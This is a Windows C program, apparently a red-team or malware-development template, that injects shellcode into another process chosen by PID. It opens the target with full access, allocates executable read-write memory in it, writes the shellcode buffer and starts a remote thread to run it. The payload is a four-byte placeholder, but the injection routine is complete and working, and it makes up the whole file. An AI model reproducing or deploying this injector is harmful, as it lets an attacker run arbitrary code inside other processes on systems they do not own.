#include <Windows.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
	
	DWORD PID = NULL;
	HANDLE hThread = NULL;
	HANDLE hProcess = NULL;
	PVOID rBuffer = NULL;

	unsigned char shellcode[] = "\x41\x41\x41\x41";

	if (argc < 2) {
		printf("Usage: %s <PID>\n", argv[0]);
		return -1;
	}

	PID = atoi(argv[1]);

	// Opening a Process
	printf("Getting a handle to process  [ %ld ]\n", PID);
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (!hProcess) {
		printf("[ %ld ]: open process failed. ERROR : %lx\n", PID , GetLastError());
				return EXIT_FAILURE;
	}
	puts("Handle to process successful...\n");
	printf("Process  handle at [ 0x%lx ]", hProcess);
	
	//Buffer Creation
	puts("\n Allocating buffer...\n");
	rBuffer = VirtualAllocEx(hProcess, NULL , sizeof(shellcode), (MEM_COMMIT| MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	if (!rBuffer) {
		printf("[ %ld ]: Memory allocation failed. ERROR : %lx\n", PID, GetLastError());
		goto CLEANUP;
	}
	puts("Memory allocation successful...\n");
	printf("Memory allocated at [ 0x%lx ]", rBuffer);

	//Writing into buffer
	puts("\n Writing into buffer...");
	WriteProcessMemory(hProcess, rBuffer, shellcode, sizeof(shellcode), 0);
	puts("Writing into buffer successful...\n");

	//Remote Thread
	puts("\n Creating a Thread...");
	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL,0,0,0);
	if (!hThread) {
		printf("[ %ld ]: Remote thread failed. ERROR : %lx\n", PID, GetLastError());
		goto CLEANUP;
	}
	puts("Remote threadsuccessful...\n");
	printf("Remote thread at [ 0x%lx ]\n", hThread);

	puts("Waiting for object\n");
	WaitForSingleObject(hThread, INFINITE);
	puts("Thread execution done.\n");
	puts("Stating the cleaning process.\n");

CLEANUP:
	if (hThread) {
		puts("Closing handle on Thread\n");
		CloseHandle(hThread);
	}
	if (hProcess) {
		puts("Closing handle on Process\n");
		CloseHandle(hProcess);
	}

	return EXIT_SUCCESS;
}